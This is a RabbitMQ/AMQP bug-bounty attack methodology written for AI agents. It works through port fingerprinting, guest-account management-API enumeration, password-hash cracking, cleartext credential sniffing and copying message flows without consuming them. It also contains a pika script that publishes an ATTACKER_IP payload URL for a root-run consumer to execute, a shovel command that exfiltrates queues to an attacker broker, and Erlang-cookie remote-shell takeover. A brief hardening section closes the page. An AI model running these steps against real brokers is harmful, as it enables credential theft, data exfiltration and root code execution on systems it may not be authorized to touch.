---
technology: "RabbitMQ / AMQP"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded THIN (2 writeup files; see internal coverage ledger) + upstream-verified: rabbitmq.com/docs/access-control (default user loopback gating), rabbitmq.com/docs/networking (5672 all interfaces), RabbitMQ management plugin API docs (15672 endpoints), RabbitMQ clustering docs (Erlang cookie), 2026-11-12. Wave 4 HT enrichment 2026-11-13: amqp-info/mechanism enumeration, RabbitMQ hash auditing (hashcat 1420), topic-copy/stream-replay/event-exchange/passive-declare/shovel-exfil read-side techniques, and CVE-2024-51988 + CVE-2025-50200 (both re-verified against rabbitmq-server GitHub advisories GHSA-pj33-75x5-32j4 and GHSA-gh3x-4x42-fvq8) — rewritten from HackTricks (src/network-services-pentesting/5671-5672-pentesting-amqp.md and 15672-pentesting-rabbitmq-management.md), CC BY-NC 4.0, accessed 2026-11-13. Erlang/epmd attack techniques intentionally NOT added (pending epmd unit proposal)."
provenance: "hybrid: corpus-grounded (3 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

Companion page: [[rabbitmq|RabbitMQ / AMQP overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# RabbitMQ Bug Bounty Methodology

**Scope:** RabbitMQ broker attack surface — AMQP 0-9-1 on 5672, management HTTP API on 15672, Erlang distribution on 25672/4369 — plus message-content abuse (credential troves in queues, privileged consumers). **Out of scope:** Apache ActiveMQ/Qpid (different brokers), Kafka ([[kafka]]), Redis-as-queue patterns, application-level AMQP client bugs.

**Authorization:** presume written permission. Publishing messages enters real business flows; draining queues can drop production data. DESTRUCTIVE flags mark queue/message-mutating steps.

**Reality note:** one engagement carries the full chain (cleartext capture → creds → publish → root-run consumer); the other contributes the banner/distribution-port fingerprint only. Management-API details are upstream-carried.

## Decision tree (one screen)

1. `15672 open http` (management UI) → Phase 3 (guest:guest from localhost; cred hunt remotely).
2. `5672 open amqp` only → Phase 2 fingerprint → Phase 4 (capture) or Phase 5 (auth + publish).
3. Local shell on the broker host → Phase 3 guest works + `rabbitmqctl` + Phase 6 cookie.
4. Any AMQP credentials (pcap, config, env) → Phase 5 enumerate-then-publish.

## Phase 1 — Fingerprinting

```bash
nmap -p4369,5672,15672,25672,1883,61613 -sV 198.51.100.10
```

Read: `5672/tcp open amqp RabbitMQ 3.7.8 (0-9)` is the version banner (observed banners: 3.7.8 and 3.8.9). 15672 = management plugin loaded (HTTP); 4369 = epmd, names registered Erlang nodes; 25672 = inter-node distribution; 1883/61613 = MQTT/STOMP listeners (same user database, more cleartext handshakes). Same-broker extras worth a probe when the port map allows: 15674/15675 (Web STOMP/Web MQTT over WebSockets) and 15692 (Prometheus metrics endpoint — often unauthenticated inventory). Presence of the `rabbitmq` system user in `/etc/passwd` (`rabbitmq:x:...:RabbitMQ messaging server,,,:/var/lib/rabbitmq:`) confirms the install from a foothold (field-observed).

The `amqp-info` NSE (`nmap -sV --script amqp-info -p 5672 198.51.100.10`) reads the connection banner without credentials: product/version, copyright, and — most useful — the advertised SASL `mechanisms` and capability list (`publisher_confirms`, `basic.nack`, `consumer_cancel_notify`), which frames what an authenticated session can abuse.

## Phase 2 — Auth fork

- **Default `guest:guest`**: works ONLY from loopback by default (`loopback_users` gating — upstream access-control docs: remote default-user connections are refused). Test remotely (cheap), then prioritize any local execution.
- **Relaxed config**: operators who set `loopback_users = none` (or `default_user`/`default_pass` overrides in rabbitmq.conf) reopen guest over the network — try the pair against 15672 and 5672 before moving on; do not assume the gate.
- **Real users**: app configs, env vars, deployment YAMLs, and message-broker connection strings (`amqp://user:***@host/vhost`) in repos; credential reuse from other services on the host (observed: one broker password appeared in captured traffic only — brokers rarely share passwords with SSH, but always check).

**2b. Mechanism enumeration on the wire.** PLAIN and AMQPLAIN are enabled by default; ANONYMOUS, where the operator enabled it, maps to `anonymous_login_user` (defaulting to `guest` — an empty username/password connect is worth one attempt); EXTERNAL appears with TLS and shifts the problem to certificate impersonation. Any Python AMQP client dumps the full advertisement before authenticating:

```python
import amqp
conn = amqp.Connection(host='198.51.100.10', port=5672, virtual_host='/')
conn.connect()
print(conn.mechanisms)                    # SASL mechanisms the broker will accept
for k, v in conn.server_properties.items(): print(k, v)
```

On 5671, `openssl s_client -alpn amqp -connect 198.51.100.10:5671 -tls1_3 -msg </dev/null` reads the certificate chain, TLS versions, and whether mutual TLS is demanded — before you commit to a credential strategy. With a low-priv shell on the host, `rabbitmq-diagnostics -q listeners` names every listener and port without touching the broker. RabbitMQ 4.x additionally serves native AMQP 1.0 on the same 5672/5671 listeners; from a 1.0 client, targeting `/queues/<queue>` publishes through the internal `amq.default` exchange — still gated by write permission on that exchange and the queue existing.

## Phase 3 — Management API and UI (15672)

```bash
# from the broker host (guest works on loopback):
curl -s -u guest:guest http://127.0.0.1:15672/api/overview | jq '.rabbitmq_version,.cluster_name'
curl -s -u guest:guest http://127.0.0.1:15672/api/users       | jq '.[].name,.tags'
curl -s -u guest:guest http://127.0.0.1:15672/api/vhosts
curl -s -u guest:guest http://127.0.0.1:15672/api/queues | jq '.[] | {vhost,name,messages}'
curl -s -u guest:guest http://127.0.0.1:15672/api/exchanges | jq '.[].name'
curl -s -u guest:guest http://127.0.0.1:15672/api/definitions -o definitions.json   # full export: users, vhosts, permissions, topology
```

`/api/definitions` is the one-shot export (users, permissions, bindings, queues) — the entire topology in one JSON. With a shell, `rabbitmqctl list_users`, `list_vhosts`, `list_queues name messages consumers`, and `list_exchanges` are the same map from CLI (run as root/service user; note `rabbitmqctl list_user_permissions <user>` for the vhost context). DESTRUCTIVE: management API writes (delete queue/purge) — avoid; you want the map, not the outage.

**3b. Auditing internal password hashes.** The internal authentication backend stores salted hashes — SHA-256 by default, SHA-512 or legacy MD5 if configured (`password_hashing_module` decides; check it before picking a cracking mode). RabbitMQ's base64 blob is `salt || digest`; hashcat mode 1420 (`sha256($salt.$pass)`) eats it once the salt is split out and hexed:

```bash
printf '%s' '<base64_hash>' | base64 -d | xxd -p -c 128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
hashcat -m 1420 --hex-salt hash.txt wordlist
```

The first 8 hex chars are the 4-byte salt; the rest is the digest. Hashes come from `/api/definitions`, `rabbitmqctl list_users` output on the host, or a mnesia backup.

## Phase 4 — Cleartext capture on 5672 (the observed chain)

```bash
# on-host (wireshark group suffices for dumpcap — field-observed):
tshark -i any -w /tmp/capture.pcap "port 5672"
# exfil the pcap, then:
tshark -r capture.pcap -Y amqp -z follow,tcp,ascii,0    # Connection.Start-Ok carries PLAIN creds
```

The AMQP 0-9-1 handshake (`Protocol-Header → Connection.Start → Connection.Start-Ok`) sends PLAIN SASL credentials unencrypted — follow the TCP stream and read `user\0password` straight out (observed: one captured stream yielded subscriber emails + passwords → user pivot → later broker creds). Same logic applies to on-path positions and to any broker without TLS listeners (`amqps`/5671 absent from nmap).

## Phase 5 — Authenticated publish (privilege by proxy)

With any broker login, enumerate as the user (their vhosts, queues, bindings), then publish — the consumer's privilege becomes yours:

```python
# observed shape — pika, verbatim
import pika
creds = pika.PlainCredentials('user', 'password')
params = pika.ConnectionParameters('198.51.100.10', 5672, '/', creds)   # '/' = default vhost
conn = pika.BlockingConnection(params)
ch = conn.channel()
ch.basic_publish(exchange='plugin_data', routing_key='', body='http://ATTACKER_IP:8000/payload.lua')
conn.close()
```

The observed escalation: root's cron ran `amqp-com` (a consumer loading Cuberite Lua plugins) every minute; a published URL was fetched and executed as root — message queue → arbitrary code. Map the pattern: process enumeration (pspy on cron-spawned consumers), queue/exchange names from Phase 3 or the pcap (`plugin_data`), then a benign canary payload (write a file to /dev/shm — one engagement did exactly this) before the real one. Delivery detail from the field: egress-filtered targets still work via SSH remote port-forward (`ssh -R 8000:127.0.0.1:8000 ...`) letting the broker fetch your payload. DESTRUCTIVE: the payload executes with consumer privilege — scope RCE first.

Also: **read the messages**. Queues carry commands, tokens, files-in-transit, and credentials (jobs payloads, SMTP relays, chat); a `basic_get`/management-UI peek is often the fastest data source once authenticated. DESTRUCTIVE on ack'd queues — prefer peek APIs that requeue.

**5b. Read-side techniques beyond a `basic_get`.** With any real login, the protocol offers quieter and broader collection than draining queues:

- **Copy flows without consuming them.** Declare a temporary exclusive queue and bind it to a topic exchange with a catch-all key (`#`, or `audit.#` / `payments.*` to focus): every matching publish delivers a COPY to you while the original consumers keep working — nothing looks consumed. Permission shape: creating the queue needs `configure`, the binding needs `write` on the exchange plus `read` on the queue, consuming needs `read`. Topic authorization is weaker than defenders expect: on fresh installs with no explicit topic permissions set, the NORMAL resource permissions alone authorize topic-exchange traffic — broad `#` binds frequently work for accounts meant to touch one narrow subject.
- **Stream queues replay history.** A queue with `x-queue-type=stream` is an append-only log, not a destructive queue: messages survive consumption, and a reader can attach from the first message, a numeric offset, or a timestamp (`arguments={'x-stream-offset': 'first'}` in pika's `consume`). A stolen read-capable account recovers historical jobs, tokens, and payloads long after the original consumers processed them. Spot stream queues in the management UI or via `rabbitmqadmin queues list name type arguments`, then immediately test replay.
- **The event exchange as a live recon feed.** Where the `rabbitmq_event_exchange` plugin is enabled, internal broker events are republished to the topic exchange `amq.rabbitmq.event`; bind a temporary queue to `user.#`, `queue.#`, or `connection.#` and failed logins, new queues, and admin activity stream past you in near real time. Event bodies are empty — read the headers and routing keys.
- **Passive-declare oracle (RabbitMQ >= 4.3.1).** Passive `queue.declare`/`exchange.declare` calls require at least one matching permission on the target object; `NOT_FOUND` (no such object) versus `ACCESS_REFUSED` (object exists, outside your permission regex) is a name-existence oracle that costs nothing.
- **Exfil by shovel.** rabbitmqadmin-ng (the v2 self-contained CLI) declares broker-side shovels: `rabbitmqadmin shovels declare_amqp091 --name loot --source-uri amqp://user:***@198.51.100.10:5672/%2f --destination-uri amqp://attacker:***@ATTACKER_IP:5672/%2f --source-queue transactions --destination-queue stolen` turns the TARGET broker into the exfiltration engine — it pumps its own queue to yours. `health_check port_listener --port 5672` proves a listener exists (not whether it is plaintext or reachable — verify separately).

```python
# the copy-without-consuming pattern in pika:
ch.queue_declare(queue='loot', exclusive=True, auto_delete=True)
ch.queue_bind(queue='loot', exchange='amq.topic', routing_key='#')
for method, props, body in ch.consume('loot', inactivity_timeout=5):
    if body: print(method.routing_key, body)
```

Republishing with flipped `basic_publish` arguments is the forge/replay direction — the same visibility into flows makes message forgery against downstream consumers possible.

**5c. Two HTTP-API bugs to gate by version** (both verified against the vendor's GitHub advisories):

- **CVE-2024-51988** — queue deletion via the HTTP API skipped the `configure` permission check. Open-source RabbitMQ AFTER 3.12.7 and BEFORE 3.12.11 (fixed 3.12.11): any user with valid credentials, SOME permission on the vhost, and management-API access can `DELETE /api/queues/%2F/<name>` queues they have no right to delete — targeted DoS by wiping a payments/processing queue. Tanzu builds carry their own ranges; check the advisory for those.
- **CVE-2025-50200** — the management API logs the full Basic `Authorization` header when a request errors (a nonexistent-queue GET is the classic trigger). Affects 3.13.0–3.13.7 and 4.0.0–4.0.7 (fixed 3.13.8 / 4.0.8). With filesystem access, `grep -R "Authorization:" /var/log/rabbitmq` and base64-decode the hits — credentials of every user whose request tripped the path. Do NOT deliberately submit third-party creds to the vulnerable endpoint; you would be manufacturing another plaintext copy.

## Phase 6 — Erlang distribution takeover

```bash
# on-host as/after the rabbitmq service user:
cat /var/lib/rabbitmq/.erlang.cookie      # 20-char shared secret
# off-host with the cookie + epmd (4369) reachable:
erl -sname attacker -cookie <COOKIE> -remsh rabbit@targethost
```

The cookie authenticates inter-node traffic (upstream: clustering docs); possession equals peer-node trust — full control of the broker (all vhosts, definitions, message access) without any AMQP credential. Requires the cookie file (service-user read or backup trove) and network reach to the distribution port 25672 (epmd 4369 for discovery). Mnesia paths under `/var/lib/rabbitmq/mnesia/rabbit@<host>/` (observed: disk-usage stats) give you the exact node name for `-remsh`.

## Phase 7 — Defense and validation notes

- **Finding shape:** capture screenshot (credentials visible in stream) + successful management/API login + the consumer-privilege proof (canary file path, `id` output). For cookie takeover: cookie file path + connected-node banner.
- **Defender telemetry (note and avoid):** management logins from `guest` off-loopback (config audit alarm), AMQP handshakes observed by EDR captures, new queue consumers binding to operational exchanges, epmd/distribution connections from unmanaged IPs.
- **Hardening:** delete or rename the default user (or keep loopback_users strict); TLS on 5671/management; per-app users with per-vhost least permissions; consumers never root (the field lesson); cookie file mode 600 and unique per estate; management API behind authenticated proxy.

## Appendix A — Tooling (named in prose)

- **nmap** — the 4369/5672/15672/25672 (+1883/61613) port map with the `amqp` version banner.
- **tshark / Wireshark / dumpcap** — AMQP cleartext capture and TCP-stream following (observed chain).
- **curl / jq** — the entire management HTTP API surface.
- **rabbitmqctl / rabbitmqadmin** — CLI enumeration and definitions export with host access.
- **pika** (Python AMQP client) — authenticated publish PoCs; any AMQP client (e.g. amqp-utils CLI tools) substitutes.
- **Erlang runtime (`erl -remsh`)** — distribution takeover with the cookie.
- **pspy** — cron-spawned consumer discovery on the host (observed: the amqp-com unmasking).
- References: RabbitMQ docs — access-control (default-user gating), networking (ports), management plugin (HTTP API), clustering (Erlang cookie) — all upstream-verified for this page.

## Appendix B — Quick reference

```bash
# ports + banner
nmap -p4369,5672,15672,25672 -sV 198.51.100.10
# management map (loopback guest)
curl -s -u guest:guest http://127.0.0.1:15672/api/queues | jq '.[] | {vhost,name,messages}'
curl -s -u guest:guest http://127.0.0.1:15672/api/definitions -o all.json
# capture creds (observed)
tshark -i any -w /tmp/capture.pcap "port 5672"
# publish canary (pika) → consumer privilege → cookie
cat /var/lib/rabbitmq/.erlang.cookie
```
